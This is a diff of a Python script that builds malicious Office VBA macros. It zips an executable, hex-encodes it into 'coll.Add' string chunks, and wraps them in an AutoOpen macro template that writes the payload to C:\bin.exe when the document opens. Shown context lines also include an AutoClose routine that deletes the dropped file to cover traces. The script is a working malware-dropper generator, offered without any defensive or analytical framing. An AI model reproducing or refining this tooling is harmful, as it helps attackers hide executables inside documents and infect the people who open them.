@@ -1,30 +1,16 @@
-from binascii import hexlify, unhexlify
+import zipfile
+from binascii import hexlify
+from zipfile import ZipFile
 
-
-def file2hex_array(input_file, output_file):
-    with open(input_file, "rb") as fd_in, open(output_file, "wb") as fd_out:
-        fd_out.write(b"\n")
-        i = 1
-        while chunk := fd_in.read(20):
-            # _string = f'''Films({i}) = "'''
-            _string = f'''Films({i}) = "'''
-            fd_out.write(bytes(_string, 'utf-8'))
-            fd_out.write(hexlify(chunk))
-            fd_out.write(b'"')
-            fd_out.write(b"\n")
-            i = i + 1
-        fd_out.write(b"]")
-
-
-def file2hex(input_file, output_file):
-    file_head = f'''
+file_head = f'''
 Sub AutoOpen()
     Dim fileName As String
     fileName = "C:\\bin.exe"
     Dim coll As Object
     Set coll = CreateObject("System.Collections.ArrayList")
 '''
-    end_of_file = f'''
+
+end_of_file = f'''
     Dim toFile
     Dim MyChar
     Open fileName For Output As #1
@@ -68,45 +54,34 @@ Sub AutoClose()
     DeleteFile ("C:\\bin.exe")
 End Sub
 '''
-    with open(input_file, "rb") as fd_in, open(output_file, "w") as fd_out:
+
+
+def file2hex(input_file, output_file):
+    # Create a ZipFile Object
+    zip_file = 'zip/temp.zip'
+
+    with ZipFile(zip_file, 'w',  zipfile.ZIP_DEFLATED) as zipObj2:
+        zipObj2.write(input_file)
+
+    with open(zip_file, "rb") as fd_in, open(output_file, "w") as fd_out:
         fd_out.write(file_head)
-        while chunk := fd_in.read(100):
+        count_str = 0
+        count_hex = 0
+        while chunk := fd_in.read(128):
+            count_str = count_str + 1
             split_strings = [hexlify(chunk)[i:i + 2] for i in range(0, len(hexlify(chunk)), 2)]
-            fd_out.write('\t\tcoll.Add ')
-            _string = f'''"'''
+            _string = f''' "'''
             for hex_var in split_strings:
-                # _string = _string + hex_var
+                count_hex = count_hex + 1
                 _string = _string + str(hex_var)[2:][:-1] + '|'
-                # _string = _string + hex_var
-                # fd_out.write(hex_var)
-                # fd_out.write(b",'")
+            print("String N_" + str(count_str))
+            _string = _string + '" & _ \n'
+            _string = _string[:-1] + '"\n'
+            _string = '\tcoll.Add ' + _string
             print(_string)
-            fd_out.write(_string[:-1])
-            fd_out.write(f'"\n')
+            fd_out.write(_string)
         fd_out.write(end_of_file)
 
 
-def hex2file(input_file, output_file):
-    with open(input_file, "rb") as fd_in, open(output_file, "wb") as fd_out:
-        for line in fd_in:
-            fd_out.write(unhexlify(line.rstrip()))
-
-
-def string2file(hex_str, output_file):
-    # print(hex_str)
-    with open(output_file, "wb") as fd_out:
-        for line in hex_str:
-            print(line)
-            print(line.rstrip())
-            print(unhexlify(line.rstrip()))
-            i = 1
-            fd_out.write(unhexlify(line.rstrip()))
-
-
 if __name__ == '__main__':
-    #   file2hex_array(f"""exe\\test.exe""", f"""hex\\new.hex""")
-    #   string2file(hex_string, f"""exe\\new_2.0.exe""")
-    file2hex(f"""exe\\test.exe""", f"""hex\\test.hex""")
-    #   hex2file(f"""hex\\test.hex""", f"""exe\\new.exe""")
-    #   hex2file(f"""hex\\test.hex""", f"""exe\\new.exe""")
-    #   hex2file(hex_string, f"""exe\\new_v2.exe""")
+    file2hex(f"""exe/bin.exe.exe""", f"""hex/m.VBA""")
